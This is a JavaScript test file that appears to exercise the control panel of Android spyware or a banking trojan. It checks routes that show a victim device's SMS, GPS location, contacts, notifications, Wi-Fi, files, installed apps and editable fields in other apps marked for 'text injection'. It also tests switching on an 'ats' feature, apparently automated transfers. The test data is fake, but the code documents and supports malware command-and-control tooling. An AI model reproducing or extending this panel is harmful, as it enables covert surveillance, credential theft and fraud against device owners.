const test = require('node:test');
const assert = require('node:assert/strict');
const express = require('express');
const path = require('node:path');
const router = require('../includes/expressRoutes');
const databaseGateway = require('../includes/databaseGateway');

function startServer() {
  const app = express();
  app.set('view engine', 'ejs');
  app.set('views', path.join(__dirname, '..', 'assets', 'views'));
  app.use(router);
  return new Promise((resolve) => {
    const server = app.listen(0, '127.0.0.1', () => {
      const address = server.address();
      resolve({ server, port: address.port });
    });
  });
}

test('panel API exposes clients and client data from the PostgreSQL-backed layer', async () => {
  const { server, port } = await startServer();

  try {
    const clientsResponse = await fetch(`http://127.0.0.1:${port}/api/clients`);
    assert.equal(clientsResponse.status, 200);
    const clientsPayload = await clientsResponse.json();
    assert.ok(Array.isArray(clientsPayload.clients));

    const clientId = 'panel-route-test';
    const dataResponse = await fetch(`http://127.0.0.1:${port}/api/clients/${clientId}/data?kind=sms`);
    assert.equal(dataResponse.status, 200);
    const dataPayload = await dataResponse.json();
    assert.ok(Array.isArray(dataPayload.data));

    const aggregateResponse = await fetch(`http://127.0.0.1:${port}/api/clients/${clientId}/data?kind=all`);
    assert.equal(aggregateResponse.status, 200);
    const aggregatePayload = await aggregateResponse.json();
    assert.ok(aggregatePayload.data && typeof aggregatePayload.data === 'object');

    const pageResponse = await fetch(`http://127.0.0.1:${port}/api/clients/${clientId}/page/sms`);
    assert.equal(pageResponse.status, 200);
    const pagePayload = await pageResponse.json();
    assert.ok(Array.isArray(pagePayload.data));

    await databaseGateway.upsertClientState(clientId, {
      clientID: clientId,
      firstSeen: new Date('2024-01-01T00:00:00.000Z'),
      lastSeen: new Date('2024-01-02T00:00:00.000Z'),
      isOnline: true,
      dynamicData: { device: { model: 'Test Device' } },
    });

    await databaseGateway.upsertClientData(clientId, 'location', {
      time: new Date('2024-01-02T00:00:00.000Z'),
      latitude: 12.34,
      longitude: 56.78,
      speed: 3.5,
      accuracy: 1.2,
    });
    await databaseGateway.upsertClientData(clientId, 'notification', {
      time: new Date('2024-01-02T00:10:00.000Z'),
      content: 'Battery low',
      title: 'System alert',
      appName: 'System',
    });
    await databaseGateway.upsertClientData(clientId, 'permissions', {
      permissions: ['camera'],
      details: [{ name: 'camera', granted: true, status: 'granted' }],
      summary: { grantedCount: 1, totalCount: 1, time: '2024-01-02T00:10:00.000Z' },
    });
    await databaseGateway.upsertClientData(clientId, 'contacts', {
      contactsList: [{ name: 'Alice', phoneNo: '+5511999999999' }],
    });
    await databaseGateway.upsertClientData(clientId, 'wifi', {
      SSID: 'TestWiFi',
      BSSID: 'AA:BB:CC:DD:EE:FF',
      firstSeen: new Date('2024-01-02T00:00:00.000Z'),
      lastSeen: new Date('2024-01-02T00:10:00.000Z'),
    });
    await databaseGateway.upsertClientData(clientId, 'downloads', {
      originalName: 'report.txt',
      path: '/downloads/report.txt',
      time: new Date('2024-01-02T00:20:00.000Z'),
    });
    await databaseGateway.upsertClientData(clientId, 'files', {
      name: 'notes.txt',
      path: '/storage/emulated/0/notes.txt',
      isDir: false,
    });
    await databaseGateway.upsertClientData(clientId, 'apps', {
      apps: [{ appName: 'Test App', packageName: 'com.example.app', versionName: '1.2.3' }],
    });
    await databaseGateway.upsertClientData(clientId, 'text_injection', {
      editableFields: [{ text: 'Email', viewId: 'email', className: 'EditText', description: 'Email field' }],
    });

    const renderResponse = await fetch(`http://127.0.0.1:${port}/manage/${clientId}/sms`);
    assert.equal(renderResponse.status, 200);
    const html = await renderResponse.text();
    assert.match(html, /SMS Log/i);

    const infoResponse = await fetch(`http://127.0.0.1:${port}/manage/${clientId}/info`);
    assert.equal(infoResponse.status, 200);
    const infoHtml = await infoResponse.text();
    assert.match(infoHtml, /Online/i);
    assert.match(infoHtml, /Test Device/i);

    const gpsResponse = await fetch(`http://127.0.0.1:${port}/manage/${clientId}/gps`);
    assert.equal(gpsResponse.status, 200);
    const gpsHtml = await gpsResponse.text();
    assert.match(gpsHtml, /12\.34/);

    const notificationsResponse = await fetch(`http://127.0.0.1:${port}/manage/${clientId}/notifications`);
    assert.equal(notificationsResponse.status, 200);
    const notificationsHtml = await notificationsResponse.text();
    assert.match(notificationsHtml, /Battery low/);

    const permissionsResponse = await fetch(`http://127.0.0.1:${port}/manage/${clientId}/permissions`);
    assert.equal(permissionsResponse.status, 200);
    const permissionsHtml = await permissionsResponse.text();
    assert.match(permissionsHtml, /granted/i);

    const contactsResponse = await fetch(`http://127.0.0.1:${port}/manage/${clientId}/contacts`);
    assert.equal(contactsResponse.status, 200);
    const contactsHtml = await contactsResponse.text();
    assert.match(contactsHtml, /Alice/i);

    const wifiResponse = await fetch(`http://127.0.0.1:${port}/manage/${clientId}/wifi`);
    assert.equal(wifiResponse.status, 200);
    const wifiHtml = await wifiResponse.text();
    assert.match(wifiHtml, /TestWiFi/i);

    const downloadsResponse = await fetch(`http://127.0.0.1:${port}/manage/${clientId}/downloads`);
    assert.equal(downloadsResponse.status, 200);
    const downloadsHtml = await downloadsResponse.text();
    assert.match(downloadsHtml, /report\.txt/i);

    const filesResponse = await fetch(`http://127.0.0.1:${port}/manage/${clientId}/files`);
    assert.equal(filesResponse.status, 200);
    const filesHtml = await filesResponse.text();
    assert.match(filesHtml, /notes\.txt/i);

    const appsResponse = await fetch(`http://127.0.0.1:${port}/manage/${clientId}/apps`);
    assert.equal(appsResponse.status, 200);
    const appsHtml = await appsResponse.text();
    assert.match(appsHtml, /Test App/i);

    const textInjectionResponse = await fetch(`http://127.0.0.1:${port}/manage/${clientId}/text_injection`);
    assert.equal(textInjectionResponse.status, 200);
    const textInjectionHtml = await textInjectionResponse.text();
    assert.match(textInjectionHtml, /Email field/i);

    const atsConfigResponse = await fetch(`http://127.0.0.1:${port}/manage/${clientId}/ats`);
    assert.equal(atsConfigResponse.status, 200);
    const atsConfig = await atsConfigResponse.json();
    assert.equal(atsConfig.enabled, false);

    const atsEnableResponse = await fetch(`http://127.0.0.1:${port}/manage/${clientId}/ats/enable/true`, { method: 'POST' });
    assert.equal(atsEnableResponse.status, 200);
    const atsEnablePayload = await atsEnableResponse.json();
    assert.equal(atsEnablePayload.enabled, true);
  } finally {
    server.close();
  }
});
